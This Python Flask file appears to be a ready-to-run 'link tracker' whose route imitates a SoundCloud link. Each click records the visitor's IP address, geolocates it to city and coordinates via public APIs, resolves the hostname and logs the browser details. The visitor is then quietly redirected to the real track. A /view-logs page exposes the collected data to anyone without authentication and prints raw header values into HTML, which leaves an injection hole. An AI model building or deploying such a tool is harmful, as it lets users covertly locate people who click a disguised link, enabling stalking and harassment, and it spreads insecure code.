from flask import Flask, request, redirect, jsonify
import datetime
import socket
import json
from urllib.request import urlopen

app = Flask(__name__)

def get_location_info(ip):
    print(f"Attempting to get location info for IP: {ip}")
    
    # Skip private IP addresses
    if ip.startswith(('10.', '172.', '192.168.')):
        print(f"IP {ip} is internal/private")
        return {'country': 'internal', 'city': 'internal', 'region': 'internal', 'latitude': 0, 'longitude': 0}
    
    # Try IP-API first
    try:
        print(f"Querying ip-api.com for {ip}")
        response = urlopen(f'http://ip-api.com/json/{ip}')
        data = json.loads(response.read())
        print(f"IP-API response: {data}")
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'unknown'),
                'city': data.get('city', 'unknown'),
                'region': data.get('regionName', 'unknown'),
                'latitude': data.get('lat', 0),
                'longitude': data.get('lon', 0)
            }
    except:
        pass

    # Fallback to ipapi.co
    try:
        response = urlopen(f'https://ipapi.co/{ip}/json')
        data = json.loads(response.read())
        return {
            'country': data.get('country_name', 'unknown'),
            'city': data.get('city', 'unknown'),
            'region': data.get('region', 'unknown'),
            'latitude': data.get('latitude', 0),
            'longitude': data.get('longitude', 0)
        }
    except:
        return {'country': 'unknown', 'city': 'unknown', 'region': 'unknown', 'latitude': 0, 'longitude': 0}

def get_dns_info(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return {'hostname': hostname}
    except:
        return {'hostname': 'unknown'}

@app.route("/")
def home():
    return "Link tracker is running"

@app.route("/soundcloud.com/<username>/<path:track>")
def track_click(username, track):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()  # Get the first IP in the chain
    user_agent = request.headers.get('User-Agent', 'unknown')
    referrer = request.headers.get('Referer', 'none')
    time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    location_info = get_location_info(ip)
    dns_info = get_dns_info(ip)

    log_entry = (
        f"[{time}] — Click Event\n"
        f"Track: {username}/{track}\n"
        f"IP Address: {ip}\n"
        f"Location: {location_info['city']}, {location_info['region']}, {location_info['country']}\n"
        f"Coordinates: {location_info['latitude']}, {location_info['longitude']}\n"
        f"Hostname: {dns_info['hostname']}\n"
        f"User-Agent: {user_agent}\n"
        f"Referrer: {referrer}\n"
        f"{'-'*40}"
    )

    with open("click_log.txt", "a") as f:
        f.write(log_entry + "\n")

    return redirect(f"https://soundcloud.com/{username}/{track}")

@app.route("/view-logs")
def view_logs():
    try:
        with open("click_log.txt", "r") as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    except FileNotFoundError:
        return "No logs yet."

if __name__ == '__main__':
    print("Starting server on port 5000...")
    try:
        app.run(host='0.0.0.0', port=5000)
    except Exception as e:
        print(f"Error starting server: {e}")